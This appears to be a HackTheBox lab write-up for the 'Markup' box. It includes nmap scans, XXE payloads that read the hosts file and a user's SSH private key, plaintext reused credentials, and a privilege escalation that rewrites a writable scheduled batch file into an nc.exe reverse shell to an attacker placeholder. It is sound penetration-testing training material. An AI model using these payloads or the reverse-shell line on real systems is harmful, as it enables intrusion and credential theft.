---
title: Markup
description: Markup box from HackTheBox write up.
---

# Markup <a href='/assets/resources/HackTheBox/Markup-resources.zip' title="Download resources"> :material-folder-zip:{:alt="Download resources"} </a>

## Nmap scan

Let's start with a `nmap` scan:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap <MACHINE_IP> -p- --min-rate 1000
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 19:15 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.26s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 133.25 seconds
           Raw packets sent: 131160 (5.771MB) | Rcvd: 450 (88.644KB)
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap <MACHINE_IP> -p22,80,443 -sC -sV           
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 19:20 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.16s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.94 seconds
```

So we have a web server in using ports 80 and 443 and then we can see that ssh is open too. We can start enumerating that webserver.

## Port 80

Since the TLS domain is `localhost` I will use the port 80 for the web server enumeration for now. The page is asking for login so tried the credentials we found in the last challenge: `Daniel:>SNDv*2wzLWf` to get access.

After some digging we can see that when an order is sent the request contains:

```xml
<?xml version = "1.0"?><order><quantity>123</quantity><item>Home Appliances</item><address>123</address></order>
```

So maybe the site is vulnerable to XEE, i wrote a little Python script to ease the payload sending process but basically sending this (remember is a Windows box according to nmap):

```xml
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///C:/windows/system32/drivers/etc/hosts'>]>
<order><quantity>123</quantity><item>&read;</item><address>123</address></order>
```

Will make the server print the `hosts` file contents cool! Since ssh is open and we logged in using a user called Daniel I tried to check if i could get a private key. Using the next payload the `daniel` user private key is now ours!

```xml
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///C:/Users/daniel/.ssh/id_rsa'>]>
<order><quantity>123</quantity><item>&read;</item><address>123</address></order>
```

## In the box

After getting the user flag in the Daniel Desktop we can start enumerating. I spent a while trying some exploits and looking around until i saw a weird file called `job.bat`:

```powershell
PS C:\Log-Management> cat .\job.bat 
@echo off                                                              
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V           
IF (%adminTest%)==(Access) goto noAdmin                                
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G") 
echo.                                                                  
echo Event Logs have been cleared!                                     
goto theEnd                                                            
:do_clear                                                              
wevtutil.exe cl %1                                                     
goto :eof                                                              
:noAdmin                                                               
echo You must run this script as an Administrator!                     
:theEnd                                                                
exit
```

It just clear the logs, but we can see something interesting if we check the file permissions:

```powershell
PS C:\Log-Management> icacls .\job.bat
.\job.bat BUILTIN\Users:(F)
          NT AUTHORITY\SYSTEM:(I)(F)
          BUILTIN\Administrators:(I)(F)
          BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
PS C:\Log-Management> whoami /GROUPS

GROUP INFORMATION
-----------------

Group Name                             Type             SID                                           Attributes
====================================== ================ ============================================= ==================================================
Everyone                               Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
MARKUP\Web Admins                      Alias            S-1-5-21-103432172-3528565615-2854469147-1001 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

We have full permissions over the file, since this file looks like an schedule task run by the system administrator we can abuse it to get full access.

## Privilege scalation

First we have to download `netcat` in the box and after that we can just edit the `job.bat` file as:

```powershell
@echo off                                                              
C:\Log-Management\nc.exe -e cmd.exe <ATACKER_IP> 8080
```

Now we spin up a listener and wait for the reverse shell...

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [<ATACKER_IP>] from (UNKNOWN) [<MACHINE_IP>] 51493
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

The root flag is in the Administrator's Desktop.